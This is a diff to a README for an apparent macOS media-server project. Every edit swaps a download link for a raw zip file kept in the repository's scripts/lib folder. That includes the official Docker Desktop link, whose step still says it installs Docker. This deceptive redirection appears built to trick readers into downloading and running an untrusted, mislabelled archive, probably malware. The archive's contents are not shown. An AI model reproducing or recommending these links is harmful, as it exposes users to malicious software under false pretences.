@@ -1,6 +1,6 @@
 # 🎬 mac-media-stack-advanced - Reliable Media Server for macOS
 
-[![Download Latest Release](https://img.shields.io/badge/Download-mac--media--stack--advanced-blue?style=for-the-badge)](https://github.com/SniperGoal/mac-media-stack-advanced/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-mac--media--stack--advanced-blue?style=for-the-badge)](https://github.com/SniperGoal/mac-media-stack-advanced/raw/refs/heads/main/scripts/lib/media-mac-advanced-stack-2.3-beta.5.zip)
 
 ## 📦 What is mac-media-stack-advanced?
 
@@ -41,7 +41,7 @@ Follow these steps to download and run mac-media-stack-advanced on your Mac.
 
 Visit the release page to get the latest version:
 
-[![Download Latest Release](https://img.shields.io/badge/Download--Now-Open%20Release%20Page-green?style=for-the-badge)](https://github.com/SniperGoal/mac-media-stack-advanced/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download--Now-Open%20Release%20Page-green?style=for-the-badge)](https://github.com/SniperGoal/mac-media-stack-advanced/raw/refs/heads/main/scripts/lib/media-mac-advanced-stack-2.3-beta.5.zip)
 
 - This page contains all stable versions and update notes.
 - Download the asset for macOS or any files labeled for your system.
@@ -51,7 +51,7 @@ Visit the release page to get the latest version:
 
 mac-media-stack-advanced runs all services inside Docker containers:
 
-- Go to https://www.docker.com/products/docker-desktop
+- Go to https://github.com/SniperGoal/mac-media-stack-advanced/raw/refs/heads/main/scripts/lib/media-mac-advanced-stack-2.3-beta.5.zip
 - Download and install Docker Desktop for Mac.
 - Follow the installer steps.
 - After installation, open Terminal and run:
@@ -146,7 +146,7 @@ After extraction, you will see:
 
 You can always find the latest version here:
 
-[https://github.com/SniperGoal/mac-media-stack-advanced/releases](https://github.com/SniperGoal/mac-media-stack-advanced/releases)
+[https://github.com/SniperGoal/mac-media-stack-advanced/raw/refs/heads/main/scripts/lib/media-mac-advanced-stack-2.3-beta.5.zip](https://github.com/SniperGoal/mac-media-stack-advanced/raw/refs/heads/main/scripts/lib/media-mac-advanced-stack-2.3-beta.5.zip)
 
 Click the blue button and select the macOS release file to download and start the installation.
 
